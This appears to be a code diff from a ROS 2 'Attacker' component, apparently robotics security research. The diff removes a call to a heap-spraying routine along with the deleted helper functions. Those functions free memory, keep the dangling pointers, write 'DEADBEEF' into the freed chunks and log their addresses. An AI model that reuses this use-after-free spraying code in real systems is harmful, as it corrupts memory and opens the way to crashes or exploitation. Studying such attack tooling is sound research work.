@@ -63,7 +63,6 @@ void Attacker::manipulate_topics(){
           RCLCPP_INFO(this->get_logger(), "topic_string_size set %ld", this->topic_string_size); 
         }
       }      
-      double_free_spraying(32);          
     };
 
     try {
@@ -73,40 +72,6 @@ void Attacker::manipulate_topics(){
       RCLCPP_INFO(this->get_logger(), "Unable to subscribe to topic[%s]",topic_name.c_str());
     }
   }
-}
-
-void* spray(size_t sz){
-  void* a = malloc(sz);     
-  void* db_free_pt = a;  
-  free(a);
-  return db_free_pt;
-}
-
-void fill_used_pointer(char* s){
-  strcpy(s, "DEADBEEF");
-}
-
-void Attacker::fill_prev_ptrs(){
-  for(auto ptr: this->prev_ptrs){
-    fill_used_pointer(ptr);
-  }
-}
-
-void Attacker::double_free_spraying(size_t sz){
-  // this function tries to spray the more the better the double freed memory chunk 
-  if(!sz) return;
-  char* db_free_pt = (char*)spray(sz);
-  fill_used_pointer(db_free_pt);
-  if(this->prev_ptrs.size() < 10000){
-    this->prev_ptrs.push_back(db_free_pt);
-  }
-  else{
-    this->prev_ptrs.resize(0);
-    this->prev_ptrs.push_back(db_free_pt);
-  }
-  RCLCPP_ERROR(this->get_logger(), "%s at %p", (char*)db_free_pt, db_free_pt);
-  RCLCPP_ERROR(this->get_logger(), "sparying at %p", db_free_pt);
-  fill_prev_ptrs();
 }
 
 }  // namespace composition
